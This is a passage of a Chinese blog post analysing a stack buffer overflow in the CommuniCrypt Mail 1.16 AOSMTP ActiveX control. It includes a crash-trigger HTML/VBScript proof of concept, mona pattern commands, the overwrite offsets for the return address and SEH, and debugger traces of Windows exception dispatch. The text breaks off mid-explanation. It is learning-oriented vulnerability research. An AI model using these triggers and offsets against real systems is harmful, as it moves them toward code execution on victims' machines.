<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>Hexo</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/21/CommuniCrypt-Mail-1-16/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/21/CommuniCrypt-Mail-1-16/" itemprop="url">CommuniCrypt Mail 1.16 - AOSMTP ActiveX Stack Buffer Overflow</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-21T11:37:18+08:00">
                2017-08-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerability/" itemprop="url" rel="index">
                    <span itemprop="name">Vulnerability</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>在看《Exploit 编写系列教程》堆喷射技术时，上面用该漏洞作例子，自己就动手调了一下，这个插件存在栈溢出，利用方式有两种，不过都是先用无效指针覆盖返回地址来触发异常：</p>
<p>1、寻找<code>pop pop ret</code>的ROP覆盖seh，并且将nseh（指向next SEH record的指针）覆盖成<code>eb 06</code>（jmp 06）的跳转指令。但实际测试过程中并不能用<code>eb 06</code>去覆盖nseh，因为程序会有坏字符。</p>
<p>2、使用heap spray，将seh覆盖成0x0c0c0c0c的地址</p>
<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">1 </span>Windows XP Service Pack <span class="number">3</span></div><div class="line"><span class="symbol">2 </span>Internet Explorer <span class="number">7</span></div></pre></td></tr></table></figure>
<h3 id="触发崩溃"><a href="#触发崩溃" class="headerlink" title="触发崩溃"></a>触发崩溃</h3><p>先用COMRaider工具去fuzz一下AOSMTP.dll中的<code>AddAttachments</code>这个成员函数，可以生成触发崩溃的脚本（wsf后缀）：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?XML version='1.0' standalone='yes' ?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">package</span>&gt;</span><span class="tag">&lt;<span class="name">job</span> <span class="attr">id</span>=<span class="string">'DoneInVBS'</span> <span class="attr">debug</span>=<span class="string">'false'</span> <span class="attr">error</span>=<span class="string">'true'</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">'clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82'</span> <span class="attr">id</span>=<span class="string">'target'</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'vbscript'</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">'File Generated by COMRaider v0.0.134 - http://labs.idefense.com</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">'Wscript.echo typename(target)</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">'for debugging/custom prolog</span></div><div class="line"><span class="undefined">targetFile = "C:\Program Files\CommuniCrypt Mail\AOSMTP.dll"</span></div><div class="line"><span class="undefined">prototype  = "Function AddAttachments ( ByVal sPath As String ) As Long"</span></div><div class="line"><span class="undefined">memberName = "AddAttachments"</span></div><div class="line"><span class="undefined">progid     = "AOSMTPLib.Mail"</span></div><div class="line"><span class="undefined">argCount   = 1</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">arg1=String(2068, "A")</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">target.AddAttachments arg1 </span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">job</span>&gt;</span><span class="tag">&lt;/<span class="name">package</span>&gt;</span></div></pre></td></tr></table></figure>
<p>删除job、package标签，加上html标签，并且更改object的闭合标签，以html后缀保存，然后用IE浏览器打开后就会产生崩溃：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">'clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82'</span> <span class="attr">id</span>=<span class="string">'target'</span> &gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'vbscript'</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">'File Generated by COMRaider v0.0.134 - http://labs.idefense.com</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">'Wscript.echo typename(target)</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">'for debugging/custom prolog</span></div><div class="line"><span class="undefined">targetFile = "C:\Program Files\CommuniCrypt Mail\AOSMTP.dll"</span></div><div class="line"><span class="undefined">prototype  = "Function AddAttachments ( ByVal sPath As String ) As Long"</span></div><div class="line"><span class="undefined">memberName = "AddAttachments"</span></div><div class="line"><span class="undefined">progid     = "AOSMTPLib.Mail"</span></div><div class="line"><span class="undefined">argCount   = 1</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">arg1=String(2068, "A")</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">target.AddAttachments arg1 </span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>选中一个文件，在上面右击并选择<code>Launch in Olly</code>，调用OD来加载：</p>
<p><img src="/img/CommuniCrypt Mail 1.16/0x01-1.png" alt="AOSMTP"></p>
<p>在OD里，查看可执行模块或者按<code>Alt+E</code>，找到<code>OLEAUT32.DLL</code>：</p>
<p><img src="/img/CommuniCrypt Mail 1.16/0x01-2.png" alt="AOSMTP"></p>
<p>双击<code>OLEAUT32.DLL</code>，然后按<code>Ctrl+N</code>，在里面找到<code>DispCallFunc</code>函数，选择它并下断点：</p>
<p><img src="/img/CommuniCrypt Mail 1.16/0x01-3.png" alt="AOSMTP"></p>
<p>F9运行之后就会断下来：</p>
<p><img src="/img/CommuniCrypt Mail 1.16/0x01-4.png" alt="AOSMTP"></p>
<p>一直按F8单步调试，直到遇见<code>call ecx</code>，这就调用了<code>AOSMTP.dll</code>的某个函数：</p>
<p><img src="/img/CommuniCrypt Mail 1.16/0x01-5.png" alt="AOSMTP"></p>
<p>F7单步跟进，可以看到调用的函数地址：</p>
<p><img src="/img/CommuniCrypt Mail 1.16/0x01-6.png" alt="AOSMTP"></p>
<p>用IDA加载<code>AOSMTP.dll</code>，跳转到<code>0x1000B4EE</code>地址，F5反编译：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">sub_1000B4EE</span><span class="params">(<span class="keyword">int</span> a1, OLECHAR *psz, <span class="keyword">int</span> a3)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// ecx@2</span></div><div class="line">  <span class="keyword">char</span> *v4; <span class="comment">// eax@3</span></div><div class="line"></div><div class="line">  *(_DWORD *)a3 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> ( psz )</div><div class="line">  &#123;</div><div class="line">    v3 = *(_DWORD *)sub_10007BAA(psz);</div><div class="line">    <span class="keyword">if</span> ( v3 )</div><div class="line">      v4 = (<span class="keyword">char</span> *)sub_10007CB3(v3);</div><div class="line">    <span class="keyword">else</span></div><div class="line">      v4 = <span class="number">0</span>;</div><div class="line">    *(_DWORD *)a3 = sub_10014A27((<span class="keyword">void</span> *)(a1 + <span class="number">48</span>), v4);</div><div class="line">    <span class="keyword">if</span> ( psz )</div><div class="line">      sub_10007C86();</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>将触发崩溃的脚本中script标签语法改成js，并加了句<code>alert</code>方便我们调试：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">'clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82'</span> <span class="attr">id</span>=<span class="string">'target'</span> &gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">alert("Ready to creash");</span></div><div class="line"><span class="undefined">var payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B";</span></div><div class="line"><span class="undefined">target.AddAttachments(payload);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>其中payload是用mona插件生成的1000长度随机字符串：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!mona pattern_create 1000</div></pre></td></tr></table></figure>
<p>用IE打开脚本，弹框后，<code>Immunity Debugger</code>附加上去，在<code>0x1000B4EE</code>下断点，F9运行，回到IE浏览器点击确定，然后单步调试执行到<code>0x1000B52A</code>指令处，可以看到函数<code>sub_10014A27</code>的参数就是我们构造的payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.text:1000B523                 push    eax             ; char *</div><div class="line">.text:1000B524                 mov     eax, [ebp+arg_0]</div><div class="line">.text:1000B527                 lea     ecx, [eax+30h]</div><div class="line">.text:1000B52A                 call    sub_10014A27</div></pre></td></tr></table></figure>
<p>F7跟进该函数，执行到<code>0x10014A6E</code>指令处时，程序将我们输入的payload复制到了栈上的一个地址，最终导致了栈溢出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.text:10014A6C                 push    edi             ; char *</div><div class="line">.text:10014A6D                 push    eax             ; char *</div><div class="line">.text:10014A6E                 call    _strcpy</div></pre></td></tr></table></figure>
<p>IDA反编译的伪代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *__<span class="function">thiscall <span class="title">sub_10014A27</span><span class="params">(<span class="keyword">void</span> *<span class="keyword">this</span>, <span class="keyword">char</span> *a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> v2; <span class="comment">// bl@1</span></div><div class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax@4</span></div><div class="line">  CHAR FileName; <span class="comment">// [sp+Ch] [bp-454h]@1</span></div><div class="line">  CHAR v5; <span class="comment">// [sp+110h] [bp-350h]@6</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">WIN32_FIND_DATAA</span> <span class="title">FindFileData</span>;</span> <span class="comment">// [sp+214h] [bp-24Ch]@3</span></div><div class="line">  <span class="keyword">char</span> v7; <span class="comment">// [sp+354h] [bp-10Ch]@1</span></div><div class="line">  <span class="keyword">void</span> *v8; <span class="comment">// [sp+458h] [bp-8h]@1</span></div><div class="line">  HANDLE hFindFile; <span class="comment">// [sp+45Ch] [bp-4h]@3</span></div><div class="line">  <span class="keyword">char</span> *v10; <span class="comment">// [sp+468h] [bp+8h]@3</span></div><div class="line"></div><div class="line">  v8 = <span class="keyword">this</span>;</div><div class="line">  <span class="built_in">memset</span>(&amp;FileName, <span class="number">0</span>, <span class="number">0x104</span>u);</div><div class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x104</span>u);</div><div class="line">  v2 = a2[<span class="built_in">strlen</span>(a2) - <span class="number">1</span>];</div><div class="line">  <span class="built_in">strcpy</span>(&amp;v7, a2);</div><div class="line">  ......</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>继续执行，来到该函数的return地址：</p>
<p><code>10014B51   C2 0400          RETN 4</code></p>
<p>栈上的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">01DCF5C0   316A4130  0Aj1</div><div class="line">01DCF5C4   00000000  ....</div><div class="line">01DCF5C8   6A41336A  j3Aj</div><div class="line">01DCF5CC   356A4134  4Aj5  Pointer to next SEH record</div><div class="line">01DCF5D0   41366A41  Aj6A  SE handler</div><div class="line">01DCF5D4   6A41376A  j7Aj</div><div class="line">01DCF5D8   396A4138  8Aj9</div><div class="line">01DCF5DC   41306B41  Ak0A</div><div class="line">01DCF5E0   6B41316B  k1Ak</div></pre></td></tr></table></figure>
<p>可以看到返回地址为<code>01DCF5C0</code>，SEH链的地址为<code>01DCF5CC</code>，用mona计算一下偏移：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!mona pattern_offset 0x356A4134</div></pre></td></tr></table></figure>
<p>得到SEH的偏移是284，返回地址的偏移是272。</p>
<p>继续F8单步执行，会因返回地址是无效的指针而触发异常。</p>
<h2 id="0x02-SEH"><a href="#0x02-SEH" class="headerlink" title="0x02 SEH"></a>0x02 SEH</h2><p>由于对SEH的调用流程不太了解，以及不太理解为什么要把nseh覆盖成<code>jmp 06</code>的指令，所以动手调试了一下。</p>
<p>用windbg调试至<code>10014B51</code>地址处，命令<code>p</code>单步运行，程序会跳转到无效的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">No prior disassembly possible</div><div class="line">316a4130 ??              ???</div><div class="line">316a4131 ??              ???</div><div class="line">316a4132 ??              ???</div><div class="line">316a4133 ??              ???</div></pre></td></tr></table></figure>
<p>继续单步执行，来到函数<code>KiUserExceptionDispatcher</code>处：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">ntdll!KiUserExceptionDispatcher:</div><div class="line">7c92e45c 8b4c2404        mov     ecx,dword ptr [esp+4]</div><div class="line">7c92e460 8b1c24          mov     ebx,dword ptr [esp]  ss:0023:01dcf2d8=01dcf2e0</div><div class="line">7c92e463 51              push    ecx</div><div class="line">7c92e464 53              push    ebx</div><div class="line">7c92e465 e8e6c40100      call    ntdll!RtlDispatchException (7c94a950)</div><div class="line">7c92e46a 0ac0            or      al,al</div><div class="line">7c92e46c 740c            je      ntdll!KiUserExceptionDispatcher+0x1e (7c92e47a)</div><div class="line">7c92e46e 5b              pop     ebx</div><div class="line">7c92e46f 59              pop     ecx</div></pre></td></tr></table></figure>
<p>执行到<code>7c92e465</code>地址处，命令<code>t</code>跟进去：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">ntdll!RtlDispatchException:</div><div class="line">7c94a950 8bff            mov     edi,edi</div><div class="line">7c94a952 55              push    ebp</div><div class="line">7c94a953 8bec            mov     ebp,esp</div><div class="line">7c94a955 83ec64          sub     esp,64h</div><div class="line">7c94a958 56              push    esi</div><div class="line">7c94a959 ff750c          push    dword ptr [ebp+0Ch]</div><div class="line">7c94a95c 8b7508          mov     esi,dword ptr [ebp+8]</div><div class="line">7c94a95f 56              push    esi</div><div class="line">7c94a960 c645ff00        mov     byte ptr [ebp-1],0</div></pre></td></tr></table></figure>
<p>执行到<code>7c94a97f</code>地址处，调用了<code>RtlpGetRegistrationHead</code>获取SEH链表的第一个结点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">7c94a97f e8748afdff      call    ntdll!RtlpGetRegistrationHead (7c9233f8)</div></pre></td></tr></table></figure>
<p>返回的结果是<code>01DCF5CC</code>，即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">01DCF5CC   356A4134  4Aj5  Pointer to next SEH record</div><div class="line">01DCF5D0   41366A41  Aj6A  SE handler</div></pre></td></tr></table></figure>
<p>继续跟进，来到地址<code>7c94a9ea</code>处，单步跟进：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">7c94a9ea e85888fdff      call    ntdll!RtlpExecuteHandlerForException (7c923247)</div></pre></td></tr></table></figure>
<p>执行到地址<code>7c923275</code>处，可以看到调用了<code>ExecuteHandler2</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">7c923261 ff742420        push    dword ptr [esp+20h]</div><div class="line">7c923265 ff742420        push    dword ptr [esp+20h]</div><div class="line">7c923269 ff742420        push    dword ptr [esp+20h]</div><div class="line">7c92326d ff742420        push    dword ptr [esp+20h]</div><div class="line">7c923271 ff742420        push    dword ptr [esp+20h]</div><div class="line">7c923275 e808000000      call    ntdll!ExecuteHandler2 (7c923282)</div></pre></td></tr></table></figure>
<p>单步跟进去，执行到地址<code>7c9232a6</code>，可以看到ecx的值为<code>41366a41</code>，即前面我们覆盖SEH的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ntdll!ExecuteHandler2:</div><div class="line">7c923282 55              push    ebp</div><div class="line">7c923283 8bec            mov     ebp,esp</div><div class="line">7c923285 ff750c          push    dword ptr [ebp+0Ch]</div><div class="line">7c923288 52              push    edx</div><div class="line">7c923289 64ff3500000000  push    dword ptr fs:[0]</div><div class="line">7c923290 64892500000000  mov     dword ptr fs:[0],esp</div><div class="line">7c923297 ff7514          push    dword ptr [ebp+14h]</div><div class="line">7c92329a ff7510          push    dword ptr [ebp+10h]</div><div class="line">7c92329d ff750c          push    dword ptr [ebp+0Ch]</div><div class="line">7c9232a0 ff7508          push    dword ptr [ebp+8]</div><div class="line">7c9232a3 8b4d18          mov     ecx,dword ptr [ebp+18h]</div><div class="line">7c9232a6 ffd1            call    ecx &#123;41366a41&#125;</div></pre></td></tr></table></figure>
<p>此时栈上的数据为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">01dcf1fc  01dcf2e0</div><div class="line">01dcf200  01dcf5cc</div><div class="line">01dcf204  01dcf2fc</div><div class="line">01dcf208  01dcf2b4</div></pre></td></tr></table></figure>
<p>查资料发现，异常处理的回掉函数结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">EXCEPTION_DISPOSITION __cdecl _except_handler(</div><div class="line">	struct _EXCEPTION_RECORD *ExceptionRecord,</div><div class="line">	<span class="keyword">void</span> * EstablisherFrame,</div><div class="line">	struct _CONTEXT *ContextRecord,</div><div class="line">	<span class="keyword">void</span> * DispatcherContext</div><div class="line">);</div></pre></td></tr></table></figure>
<p>该函数的第一个参数是一个指向EXCEPTION_RECORD结构的指针。这个结构在WINNT.H中定义，如下所示：</p>
